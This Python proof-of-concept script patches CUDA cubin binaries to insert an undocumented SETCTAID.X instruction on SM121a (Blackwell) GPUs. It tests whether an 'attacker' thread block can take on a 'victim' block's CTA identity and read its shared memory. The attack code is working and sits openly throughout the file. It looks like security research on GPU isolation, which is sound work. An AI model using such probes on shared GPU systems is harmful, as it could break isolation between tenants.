#!/usr/bin/env python3
"""
SETCTAID.X Proof-of-Concept
============================

Tests whether the undocumented SETCTAID.X instruction (opcode 0x31f) on
SM121a (Blackwell GB10) can modify the CTA (block) identity of a running
warp, and whether that change propagates to hardware-level shared memory
routing.

Stage 1 - Register Readback:
  Confirms SETCTAID.X actually modifies the value returned by S2R SR_CTAID.X.
  Patches a compiled cubin to insert SETCTAID.X before reading blockIdx.x.

Stage 2 - Cross-CTA Shared Memory Probe:
  Tests whether changing CTA ID allows reading another block's shared memory.
  Block 0 (victim) writes 0xDEADBEEF to SMEM.
  Block 1 (attacker) executes SETCTAID.X=0 then reads SMEM via LDS.

Requires: CUDA toolkit (nvcc, nvdisasm), CUDA driver, SM121a GPU.
"""

import ctypes
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from ctypes import (
    byref, c_char, c_int, c_size_t, c_uint, c_ulonglong, c_void_p,
    create_string_buffer,
)

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from src.cubin_utils import (
    disassemble_cubin,
    find_text_section as find_text_section_shared,
    patch_instruction_words,
)


# ---------------------------------------------------------------------------
# CUDA Driver API types
# ---------------------------------------------------------------------------

CUDA_SUCCESS = 0
CUdevice = c_int
CUcontext = c_void_p
CUmodule = c_void_p
CUfunction = c_void_p
CUdeviceptr = c_ulonglong


def load_cuda_driver():
    """Load libcuda and set up function prototypes."""
    lib = ctypes.CDLL("libcuda.so.1")
    lib.cuInit(c_uint(0))
    return lib


def cuda_check(lib, err, msg="CUDA error"):
    """Check CUDA error code and raise if non-zero."""
    if err != CUDA_SUCCESS:
        raise RuntimeError(f"{msg}: CUDA error {err}")


# ---------------------------------------------------------------------------
# Cubin compilation and patching helpers
# ---------------------------------------------------------------------------

def compile_kernel(source: str, target: str = "sm_121a", extra_flags=None) -> bytes:
    """Compile CUDA C++ source to cubin binary."""
    with tempfile.NamedTemporaryFile(suffix=".cu", mode="w", delete=False) as f:
        f.write(source)
        cu_path = f.name

    cubin_path = cu_path.replace(".cu", ".cubin")
    cmd = ["nvcc", "-cubin", f"-arch={target}", "-o", cubin_path, cu_path]
    if extra_flags:
        cmd.extend(extra_flags)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            raise RuntimeError(f"nvcc failed:\n{result.stderr}")
        with open(cubin_path, "rb") as f:
            return f.read()
    finally:
        for p in [cu_path, cubin_path]:
            if os.path.exists(p):
                os.unlink(p)


def disassemble(cubin_data: bytes, flags=("-hex",)) -> str:
    """Disassemble cubin with nvdisasm."""
    return disassemble_cubin(cubin_data, flags=flags, timeout_s=10)


def find_text_section(data: bytes):
    """Find .text section offset and size in cubin ELF."""
    return find_text_section_shared(data)


def find_instruction_by_mnemonic(disasm_text: str, mnemonic: str):
    """Find instruction offset and encoding from nvdisasm -hex output.

    Returns list of (offset, lo_word, hi_word) tuples.
    """
    results = []
    lines = disasm_text.splitlines()
    for i, line in enumerate(lines):
        if mnemonic in line and "/*" in line:
            # Extract offset: /*0040*/
            try:
                offset_str = line.split("/*")[1].split("*/")[0].strip()
                offset = int(offset_str, 16)
            except (IndexError, ValueError):
                continue
            # Extract hex encoding: /* 0x... */
            try:
                hex_str = line.split("/* 0x")[1].split(" */")[0]
                lo_word = int(hex_str, 16)
            except (IndexError, ValueError):
                continue
            # Next line has the hi word
            if i + 1 < len(lines):
                try:
                    hi_str = lines[i + 1].split("/* 0x")[1].split(" */")[0]
                    hi_word = int(hi_str, 16)
                except (IndexError, ValueError):
                    hi_word = 0
            results.append((offset, lo_word, hi_word))
    return results


def patch_instruction(cubin_data: bytes, text_offset: int, inst_offset_in_text: int,
                      new_lo: int, new_hi: int = None) -> bytearray:
    """Patch a 128-bit instruction in the cubin .text section."""
    file_offset = text_offset + inst_offset_in_text
    return patch_instruction_words(
        cubin_data,
        file_offset=file_offset,
        lo_word=new_lo,
        hi_word=new_hi,
    )


def encode_setctaid_x(src_reg: int, sysreg_field: int = 0x057) -> int:
    """Encode SETCTAID.X Rsrc instruction (lower 64-bit word).

    Opcode 0x31f.
    bits [11:0]  = 0x31f (opcode)
    bits [19:12] = system register selector (0x57 = CTAID.X from S2R encoding)
    bits [23:20] = upper nibble of sysreg field
    bits [31:24] = source register number

    The sysreg_field comes from the S2R encoding where it selects SR_TID.X.
    For SETCTAID, we preserve this field as it likely selects CTAID.X.
    """
    return 0x31f | (sysreg_field << 12) | (src_reg << 24)


# ---------------------------------------------------------------------------
# CUDA Driver API helpers
# ---------------------------------------------------------------------------

def gpu_init(lib):
    """Initialize CUDA and create context."""
    dev = CUdevice()
    lib.cuDeviceGet(byref(dev), c_int(0))
    ctx = CUcontext()
    err = lib.cuCtxCreate_v2(byref(ctx), c_uint(0), dev)
    cuda_check(lib, err, "cuCtxCreate")

    # Get GPU name
    name_buf = ctypes.create_string_buffer(256)
    lib.cuDeviceGetName(name_buf, c_int(256), dev)
    return ctx, name_buf.value.decode()


def load_cubin(lib, cubin_data: bytes):
    """Load a cubin into a CUDA module."""
    buf = create_string_buffer(bytes(cubin_data))
    module = CUmodule()
    err = lib.cuModuleLoadData(byref(module), buf)
    return module, err


def get_function(lib, module, name: bytes):
    """Get a kernel function from a module."""
    func = CUfunction()
    err = lib.cuModuleGetFunction(byref(func), module, name)
    return func, err


def alloc_gpu(lib, size: int):
    """Allocate GPU memory."""
    d_ptr = CUdeviceptr()
    err = lib.cuMemAlloc_v2(byref(d_ptr), c_size_t(size))
    cuda_check(lib, err, "cuMemAlloc")
    lib.cuMemsetD8_v2(d_ptr, c_char(0), c_size_t(size))
    return d_ptr


def free_gpu(lib, d_ptr):
    """Free GPU memory."""
    lib.cuMemFree_v2(d_ptr)


def read_gpu(lib, d_ptr, n_uint32: int):
    """Read uint32 array from GPU."""
    host = (ctypes.c_uint * n_uint32)()
    lib.cuMemcpyDtoH_v2(host, d_ptr, c_size_t(n_uint32 * 4))
    return list(host)


def launch_kernel(lib, func, grid, block, params):
    """Launch a CUDA kernel with given parameters.

    params: list of CUdeviceptr values
    """
    param_storage = []
    param_ptrs = (c_void_p * len(params))()
    for i, p in enumerate(params):
        if isinstance(p, int):
            storage = CUdeviceptr(p)
        elif isinstance(p, CUdeviceptr):
            storage = CUdeviceptr(p.value)
        else:
            storage = p
        param_storage.append(storage)
        param_ptrs[i] = ctypes.cast(ctypes.pointer(storage), c_void_p)

    gx, gy, gz = grid
    bx, by, bz = block

    err = lib.cuLaunchKernel(
        func,
        c_uint(gx), c_uint(gy), c_uint(gz),
        c_uint(bx), c_uint(by), c_uint(bz),
        c_uint(0), c_void_p(0), param_ptrs, c_void_p(0),
    )
    return err


# ---------------------------------------------------------------------------
# Stage 1: Register Readback
# ---------------------------------------------------------------------------

STAGE1_KERNEL = r"""
// Stage 1: Read blockIdx.x, store to output.
// We'll patch the NANOSLEEP to become SETCTAID.X, then check if the
// CTA ID register changed.
//
// We load a known constant (99) into a register BEFORE the patch point
// so we can use that register as the source for SETCTAID.X.
extern "C" __global__ void poc_stage1(unsigned int* out) {
    // Read ORIGINAL CTA ID first
    unsigned int orig_cta_id;
    asm volatile("mov.u32 %0, %%ctaid.x;" : "=r"(orig_cta_id));
    out[blockIdx.x * 4 + 0] = orig_cta_id;  // slot 0: original CTA ID

    // Load a known value into R-scratch that we'll use as SETCTAID source
    // The compiler will put 99 into some register. We also need to know
    // which register. We'll figure this out from the disassembly.
    unsigned int scratch = 99;
    asm volatile("" : "+r"(scratch));  // prevent optimization

    // === PATCH TARGET: this NANOSLEEP will become SETCTAID.X ===
    asm volatile("nanosleep.u32 0;");

    // Read CTA ID AFTER the patched instruction
    unsigned int new_cta_id;
    asm volatile("mov.u32 %0, %%ctaid.x;" : "=r"(new_cta_id));
    out[blockIdx.x * 4 + 1] = new_cta_id;   // slot 1: CTA ID after patch

    // Also store scratch value (to verify it wasn't optimized away)
    out[blockIdx.x * 4 + 2] = scratch;
    unsigned int smid;
    asm volatile("mov.u32 %0, %%smid;" : "=r"(smid));
    out[blockIdx.x * 4 + 3] = smid;
}
"""


def run_stage1(lib):
    """Stage 1: Test if SETCTAID.X modifies the CTA ID register.

    Tries multiple encoding variants since the exact field layout is unknown.
    """
    print("=" * 70)
    print("  STAGE 1: SETCTAID.X Register Readback Test")
    print("=" * 70)
    print()

    # Compile kernel
    print("  [1/4] Compiling Stage 1 kernel...")
    cubin_data = compile_kernel(STAGE1_KERNEL)
    text_offset, text_size, sect_name = find_text_section(cubin_data)
    print(f"         .text at 0x{text_offset:x}, size {text_size}")

    # Disassemble
    print("  [2/4] Disassembling...")
    disasm = disassemble(cubin_data)

    nanosleep_hits = find_instruction_by_mnemonic(disasm, "NANOSLEEP")
    if not nanosleep_hits:
        print("  ERROR: Could not find NANOSLEEP instruction.")
        print(disasm)
        return False

    patch_offset, orig_lo, orig_hi = nanosleep_hits[0]
    print(f"         NANOSLEEP at offset 0x{patch_offset:x}")
    print(f"         Encoding: lo=0x{orig_lo:016x} hi=0x{orig_hi:016x}")

    # Print full text section disassembly for context
    print()
    print("         Full kernel disassembly:")
    in_text = False
    for line in disasm.splitlines():
        if ".text." in line:
            in_text = True
        if in_text and line.strip():
            print(f"         {line}")
        if in_text and ".L_x_1:" in line:
            break

    # Try multiple encoding variants for SETCTAID.X
    # Variant A: minimal encoding (opcode only)
    # Variant B: with sysreg field from S2R (0x057)
    # Variant C: with sysreg field and R0 explicit in register field
    # Variant D: use the *exact* encoding from Phase 3 (0x000000000005731f)

    encodings = [
        ("Variant A: bare opcode 0x31f",
         0x000000000000031f, orig_hi),
        ("Variant B: with sysreg field (0x057)",
         encode_setctaid_x(src_reg=0, sysreg_field=0x057), orig_hi),
        ("Variant C: Phase 3 exact (0x000000000005731f)",
         0x000000000005731f, 0x000e2e0000002100),
        ("Variant D: sysreg + scheduling from NOP",
         encode_setctaid_x(src_reg=0, sysreg_field=0x057), 0x000fc00000000000),
    ]

    print()
    print("  [3/4] Testing encoding variants...")
    any_success = False

    for label, test_lo, test_hi in encodings:
        patched_cubin = patch_instruction(
            cubin_data, text_offset, patch_offset, test_lo, test_hi
        )

        # Verify what nvdisasm sees
        verify = disassemble(bytes(patched_cubin), flags=("-c",))
        mnem_line = ""
        for line in verify.splitlines():
            if f"/*{patch_offset:04x}*/" in line:
                mnem_line = line.split("*/", 1)[1].strip() if "*/" in line else line
                break

        print()
        print(f"         {label}")
        print(f"           lo=0x{test_lo:016x} hi=0x{test_hi:016x}")
        print(f"           nvdisasm: {mnem_line}")

        # Load and launch
        module, err = load_cubin(lib, bytes(patched_cubin))
        if err != CUDA_SUCCESS:
            print(f"           Load FAILED (error {err})")
            continue

        func, err = get_function(lib, module, b"poc_stage1")
        if err != CUDA_SUCCESS:
            print(f"           GetFunction FAILED (error {err})")
            lib.cuModuleUnload(module)
            continue

        d_out = alloc_gpu(lib, 32)
        err = launch_kernel(lib, func, grid=(2, 1, 1), block=(1, 1, 1), params=[d_out])
        if err != CUDA_SUCCESS:
            print(f"           Launch FAILED (error {err})")
            free_gpu(lib, d_out)
            lib.cuModuleUnload(module)
            continue

        err = lib.cuCtxSynchronize()
        if err != CUDA_SUCCESS:
            print(f"           Sync FAILED (error {err}) -- illegal instruction or hang")
            free_gpu(lib, d_out)
            lib.cuModuleUnload(module)

            # GPU context is now poisoned -- recreate
            lib.cuCtxDestroy_v2(c_void_p(0))
            ctx, _ = gpu_init(lib)
            continue

        results = read_gpu(lib, d_out, 8)
        free_gpu(lib, d_out)
        lib.cuModuleUnload(module)

        b0_orig, b0_after = results[0], results[1]
        b1_orig, b1_after = results[4], results[5]
        scratch_b0, scratch_b1 = results[2], results[6]

        print(f"           Block 0: CTA {b0_orig} -> {b0_after}  scratch={scratch_b0}  SM={results[3]}")
        print(f"           Block 1: CTA {b1_orig} -> {b1_after}  scratch={scratch_b1}  SM={results[7]}")

        if b1_orig != b1_after:
            print(f"           >>> CTA ID CHANGED! Block 1: {b1_orig} -> {b1_after}")
            any_success = True
        elif b0_orig != b0_after:
            print(f"           >>> CTA ID CHANGED! Block 0: {b0_orig} -> {b0_after}")
            any_success = True
        else:
            print(f"           No change (NOP)")

    print()
    print("  [4/4] Summary:")
    if any_success:
        print("         SETCTAID.X MODIFIES CTA ID REGISTER")
        return True
    else:
        print("         SETCTAID.X appears to be a NOP across all encoding variants.")
        print("         The instruction executes without fault but has no observable effect")
        print("         on the CTA ID register. This is Level 0 (harmless).")
        return False


# ---------------------------------------------------------------------------
# Stage 2: Cross-CTA Shared Memory Access
# ---------------------------------------------------------------------------

STAGE2_KERNEL = r"""
// Stage 2: Cross-CTA shared memory probe.
//
// Block 0 (victim): writes 0xDEADBEEF to shared memory, signals via global flag.
// Block 1 (attacker): waits for signal, then reads shared memory.
//
// Between signal and read, we'll patch in SETCTAID.X = 0 to attempt
// reading block 0's shared memory from block 1.
//
// The shared memory read (LDS) after SETCTAID.X is the critical test:
// if the attacker reads 0xDEADBEEF, shared memory routing was changed.

extern "C" __global__ void poc_stage2(unsigned int* out, volatile unsigned int* flags) {
    __shared__ unsigned int smem[256];

    if (blockIdx.x == 0) {
        // VICTIM BLOCK
        if (threadIdx.x == 0) {
            // Write magic value to shared memory
            smem[0] = 0xDEADBEEFu;
            smem[1] = 0xCAFEBABEu;
            smem[2] = 0x12345678u;
            smem[3] = 0xA5A5A5A5u;
            __threadfence_block();

            // Signal: victim ready
            atomicExch((unsigned int*)&flags[0], 1u);

            // Wait for attacker to finish
            while (atomicAdd((unsigned int*)&flags[1], 0u) == 0u) {
                // spin
            }
        }
        __syncthreads();

        // Store victim's own SMEM read for verification
        out[0] = smem[0];  // should be 0xDEADBEEF
        out[1] = smem[1];  // should be 0xCAFEBABE

    } else if (blockIdx.x == 1) {
        // ATTACKER BLOCK
        if (threadIdx.x == 0) {
            // Initialize attacker's own shared memory to a known different value
            smem[0] = 0x11111111u;
            smem[1] = 0x22222222u;
            smem[2] = 0x33333333u;
            smem[3] = 0x44444444u;
            __threadfence_block();

            // Wait for victim to be ready
            while (atomicAdd((unsigned int*)&flags[0], 0u) == 0u) {
                // spin
            }

            // Read SMEM BEFORE the patch (should be attacker's own values)
            out[4] = smem[0];  // expect 0x11111111
            out[5] = smem[1];  // expect 0x22222222

            // === PATCH TARGET: NANOSLEEP will become SETCTAID.X R0 ===
            asm volatile("nanosleep.u32 0;");

            // Read SMEM AFTER the patch
            // If SETCTAID.X changed CTA identity, hardware may route
            // this LDS to block 0's shared memory partition
            out[6] = smem[0];  // 0xDEADBEEF if exploit works, 0x11111111 if not
            out[7] = smem[1];  // 0xCAFEBABE if exploit works, 0x22222222 if not

            // Read CTA ID to confirm it changed
            unsigned int cta_id;
            asm volatile("mov.u32 %0, %%ctaid.x;" : "=r"(cta_id));
            out[8] = cta_id;

            // Store SM ID to verify co-location
            unsigned int smid;
            asm volatile("mov.u32 %0, %%smid;" : "=r"(smid));
            out[9] = smid;

            // Signal: attacker done
            atomicExch((unsigned int*)&flags[1], 1u);
        }
        __syncthreads();
    }

    // Both blocks: store SM ID for co-location check
    if (threadIdx.x == 0) {
        unsigned int smid;
        asm volatile("mov.u32 %0, %%smid;" : "=r"(smid));
        // Block 0 -> out[2], Block 1 -> out[3]
        out[2 + blockIdx.x] = smid;
    }
}
"""


def run_stage2(lib):
    """Stage 2: Test cross-CTA shared memory access via SETCTAID.X."""
    print()
    print("=" * 70)
    print("  STAGE 2: Cross-CTA Shared Memory Probe")
    print("=" * 70)
    print()

    # Compile
    print("  [1/6] Compiling Stage 2 kernel...")
    cubin_data = compile_kernel(STAGE2_KERNEL)
    text_offset, text_size, sect_name = find_text_section(cubin_data)
    print(f"         .text at 0x{text_offset:x}, size {text_size}")

    # Disassemble
    print("  [2/6] Disassembling to find NANOSLEEP patch target...")
    disasm = disassemble(cubin_data)

    nanosleep_hits = find_instruction_by_mnemonic(disasm, "NANOSLEEP")
    if not nanosleep_hits:
        print("  ERROR: Could not find NANOSLEEP instruction.")
        print(disasm)
        return

    # We want the NANOSLEEP in block 1's code path. If there's only one,
    # that's it. If multiple, we want the one in the attacker path.
    patch_offset, orig_lo, orig_hi = nanosleep_hits[0]
    if len(nanosleep_hits) > 1:
        print(f"         Found {len(nanosleep_hits)} NANOSLEEP instructions, using last one")
        patch_offset, orig_lo, orig_hi = nanosleep_hits[-1]

    print(f"         Patch target at offset 0x{patch_offset:x}")

    # First run: UNPATCHED (baseline)
    print("  [3/6] Running UNPATCHED kernel (baseline)...")
    baseline_results = _launch_stage2(lib, cubin_data)
    if baseline_results is None:
        return

    _print_stage2_results("BASELINE (no SETCTAID.X)", baseline_results)

    # Patch NANOSLEEP -> SETCTAID.X R0
    print("  [4/6] Patching NANOSLEEP -> SETCTAID.X R0...")
    setctaid_lo = encode_setctaid_x(src_reg=0)
    patched_cubin = patch_instruction(
        cubin_data, text_offset, patch_offset, setctaid_lo, orig_hi
    )

    # Verify
    verify = disassemble(bytes(patched_cubin))
    for line in verify.splitlines():
        if "SETCTAID" in line:
            print(f"         Verified: {line.strip()}")
            break

    # Run patched
    print("  [5/6] Running PATCHED kernel (SETCTAID.X R0)...")
    patched_results = _launch_stage2(lib, bytes(patched_cubin))
    if patched_results is None:
        return

    _print_stage2_results("PATCHED (SETCTAID.X R0)", patched_results)

    # Analysis
    print("  [6/6] Analysis:")
    print()

    b1_before = patched_results[4]
    b1_after = patched_results[6]
    b1_ctaid = patched_results[8]
    b0_smid = patched_results[2]
    b1_smid = patched_results[3]

    if b0_smid == b1_smid:
        print(f"         Blocks co-located on SM {b0_smid} (same SM)")
    else:
        print(f"         WARNING: Blocks on different SMs ({b0_smid} vs {b1_smid})")
        print(f"         Cross-SMEM test may not be meaningful without co-location.")
        print(f"         Try running again -- the scheduler may place them together.")

    print()

    if b1_after == 0xDEADBEEF:
        print("  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("  !! OBSERVED RESULT: CROSS-CTA SHARED MEMORY READ PATTERN  !!")
        print("  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print()
        print("  Attacker block read victim's shared memory (0xDEADBEEF)")
        print("  after executing SETCTAID.X to impersonate victim's CTA ID.")
        print()
        print("  In this run, results are consistent with SETCTAID.X affecting")
        print("  hardware-visible CTA identity, not only software-visible state.")
        print()
        print("  This behavior should be validated across driver/toolkit versions,")
        print("  scheduling conditions, and hardware revisions before generalization.")
    elif b1_after == 0x11111111:
        print("  RESULT: Shared memory routing NOT affected.")
        print(f"          Attacker still reads its own SMEM (0x{b1_after:08x})")
        if b1_ctaid == 0:
            print("          But CTA ID register DID change (Level 1 only).")
            print("          The write is register-only, not hardware identity.")
        else:
            print(f"          CTA ID also unchanged ({b1_ctaid}).")
            print("          SETCTAID.X may be a pure NOP on this hardware.")
    else:
        print(f"  RESULT: Unexpected SMEM value: 0x{b1_after:08x}")
        print(f"          (expected 0xDEADBEEF or 0x11111111)")
        print(f"          CTA ID after patch: {b1_ctaid}")


def _launch_stage2(lib, cubin_data):
    """Helper: load cubin, launch stage 2 kernel, return results."""
    module, err = load_cubin(lib, cubin_data)
    if err != CUDA_SUCCESS:
        print(f"  ERROR: cuModuleLoadData failed with error {err}")
        return None

    func, err = get_function(lib, module, b"poc_stage2")
    if err != CUDA_SUCCESS:
        print(f"  ERROR: cuModuleGetFunction failed with error {err}")
        lib.cuModuleUnload(module)
        return None

    # Allocate: out[10] + flags[2]
    d_out = alloc_gpu(lib, 40)   # 10 * 4 = 40 bytes
    d_flags = alloc_gpu(lib, 8)  # 2 * 4 = 8 bytes

    err = launch_kernel(
        lib, func,
        grid=(2, 1, 1), block=(32, 1, 1),  # 2 blocks x 32 threads
        params=[d_out, d_flags],
    )
    if err != CUDA_SUCCESS:
        print(f"  ERROR: cuLaunchKernel failed with error {err}")
        free_gpu(lib, d_out)
        free_gpu(lib, d_flags)
        lib.cuModuleUnload(module)
        return None

    err = lib.cuCtxSynchronize()
    if err != CUDA_SUCCESS:
        print(f"  ERROR: cuCtxSynchronize failed with error {err}")
        print(f"         (715=ILLEGAL_INSTRUCTION, 700=ILLEGAL_ADDRESS)")
        free_gpu(lib, d_out)
        free_gpu(lib, d_flags)
        lib.cuModuleUnload(module)
        return None

    results = read_gpu(lib, d_out, 10)
    free_gpu(lib, d_out)
    free_gpu(lib, d_flags)
    lib.cuModuleUnload(module)
    return results


def _print_stage2_results(label, results):
    """Pretty-print stage 2 results."""
    print()
    print(f"         --- {label} ---")
    print(f"         Block 0 (victim):")
    print(f"           SMEM[0]: 0x{results[0]:08x} (expect 0xDEADBEEF)")
    print(f"           SMEM[1]: 0x{results[1]:08x} (expect 0xCAFEBABE)")
    print(f"           SM ID:   {results[2]}")
    print(f"         Block 1 (attacker):")
    print(f"           SM ID:   {results[3]}")
    print(f"           SMEM before SETCTAID: 0x{results[4]:08x} (expect 0x11111111)")
    print(f"           SMEM[1] before:       0x{results[5]:08x} (expect 0x22222222)")
    print(f"           SMEM after SETCTAID:  0x{results[6]:08x} (0xDEADBEEF = vuln!)")
    print(f"           SMEM[1] after:        0x{results[7]:08x} (0xCAFEBABE = vuln!)")
    if len(results) > 8:
        print(f"           CTA ID after patch:   {results[8]}")
    if len(results) > 9:
        print(f"           SM ID (from asm):     {results[9]}")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print()
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║     SETCTAID.X Proof-of-Concept (SM121a / Blackwell)    ║")
    print("  ╠══════════════════════════════════════════════════════════╣")
    print("  ║  Opcode 0x31f: CTA ID write candidate in this test flow ║")
    print("  ║  Triggered from Phase 3-derived opcode candidate set    ║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    print()

    lib = load_cuda_driver()
    ctx, gpu_name = gpu_init(lib)
    print(f"  GPU: {gpu_name}")
    print()

    # Stage 1
    stage1_success = run_stage1(lib)

    if stage1_success:
        print()
        print("  Stage 1 observed CTA-ID-changing behavior for SETCTAID.X.")
        print("  Proceeding to Stage 2: cross-CTA shared memory probe...")
        run_stage2(lib)
    else:
        print()
        print("  Stage 1 indicates SETCTAID.X may not modify CTA ID.")
        print("  Running Stage 2 anyway for completeness...")
        run_stage2(lib)

    # Cleanup
    lib.cuCtxDestroy_v2(ctx)
    print()
    print("  Done.")


if __name__ == "__main__":
    main()
